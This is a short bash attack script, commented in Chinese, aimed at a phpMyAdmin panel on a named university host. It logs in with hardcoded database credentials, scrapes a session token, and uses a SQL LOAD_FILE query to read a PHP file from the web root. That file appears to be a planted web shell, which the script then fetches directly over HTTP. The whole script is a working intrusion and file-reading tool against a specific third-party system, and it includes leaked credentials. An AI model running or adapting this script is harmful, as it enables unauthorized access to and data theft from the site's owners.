#!/bin/bash

URL="https://olympic.su.ac.th/phpmyadmin/"
COOKIES="/tmp/pmacookies.txt"
FILE_PATH="/var/www/html/banpot/scmeeting/x.php"

curl -k -s -c "$COOKIES" "$URL" > /dev/null
TOKEN=$(curl -k -s -b "$COOKIES" -c "$COOKIES" -X POST "${URL}index.php" \
  -d "pma_username=mysql&pma_password=Mu123.123.&server=1" -L | \
  grep -oP 'token=\K[^"&]+' | head -1)

echo "[*] 读取文件: $FILE_PATH"
echo "[*] Token: $TOKEN"
echo ""

# 读取文件内容
RESPONSE=$(curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SELECT LOAD_FILE('$FILE_PATH');" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded")

# 提取文件内容
echo "$RESPONSE" | grep -oP '<td[^>]*class="value"[^>]*>.*?</td>' | \
  sed 's/<[^>]*>//g' | \
  sed 's/&lt;/</g; s/&gt;/>/g; s/&amp;/\&/g; s/&quot;/"/g; s/&#39;/'"'"'/g' | \
  head -50

# 如果上面没结果，尝试直接访问
echo ""
echo "[*] 尝试直接HTTP访问..."
curl -k -s "https://olympic.su.ac.th/banpot/scmeeting/x.php" | head -50
